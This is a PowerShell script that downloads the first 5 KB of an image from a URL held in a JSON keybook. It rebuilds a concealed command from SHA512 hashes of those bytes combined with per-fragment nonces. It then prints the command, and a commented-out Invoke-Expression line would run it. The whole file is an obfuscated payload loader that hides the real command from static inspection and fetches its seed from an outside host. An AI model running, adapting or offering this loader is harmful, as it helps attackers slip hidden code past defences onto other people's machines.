function Invoke-HashedPayload {
    <#
    .SYNOPSIS
        Reconstructs a PowerShell command from an image's entropy using hex fragments.
    #>
    param (
        [Parameter(Mandatory=$true)]
        [String]$JsonPath
    )

    try {
        # 1. Load the Keybook
        if (-not (Test-Path $JsonPath)) { throw "Keybook not found at $JsonPath" }
        $Payload = Get-Content -Raw $JsonPath | ConvertFrom-Json

        Write-Host "[*] Source Image: $($Payload.u)" -ForegroundColor Gray

        # 2. Download the Entropy Seed (5KB chunk)
        $Request = [System.Net.HttpWebRequest]::Create($Payload.u)
        $Request.Method = "GET"
        $Request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        $Request.AddRange(0, 5120)

        $Response = $Request.GetResponse()
        $Stream = $Response.GetResponseStream()
        $MemoryStream = New-Object System.IO.MemoryStream
        $Stream.CopyTo($MemoryStream)

        $SeedBytes = $MemoryStream.ToArray()
        $Response.Close()
        $MemoryStream.Dispose()

        $FinalCommand = ""
        $Hasher = [System.Security.Cryptography.SHA512]::Create()

        Write-Host "[*] Reassembling fragments..." -ForegroundColor Gray

        # 3. Iterate through each key and reconstruct the string
        foreach ($Key in $Payload.keys) {
            # Combine seed bytes with the specific nonce for this fragment
            $NonceBytes = [System.Text.Encoding]::UTF8.GetBytes($Key.n.ToString())
            $CombinedBuffer = $SeedBytes + $NonceBytes

            # Compute Hash and convert to Hex string
            $HashBytes = $Hasher.ComputeHash($CombinedBuffer)
            $HashString = [System.BitConverter]::ToString($HashBytes).Replace("-", "").ToLower()

            # Extract the Hex chunk based on Offset and Length
            $HexFragment = $HashString.Substring($Key.o, $Key.l)

            # Convert Hex pairs back to ASCII characters
            for ($i = 0; $i -lt $HexFragment.Length; $i += 2) {
                $Byte = [Convert]::ToByte($HexFragment.Substring($i, 2), 16)
                $FinalCommand += [char]$Byte
            }
        }

        Write-Host "`n[+] Assembled Payload:" -ForegroundColor Cyan
        Write-Host "--------------------------------------------------"
        Write-Host $FinalCommand -ForegroundColor Yellow
        Write-Host "--------------------------------------------------"

        # 4. Trigger the payload
        # To run the code, uncomment the line below:
        # Invoke-Expression $FinalCommand
    }
    catch {
        Write-Error "Reconstruction failed: $($_.Exception.Message)"
    }
}

# --- Execution ---
# Ensure keybook.json is in the same directory
Invoke-HashedPayload -JsonPath ".\keybook.json"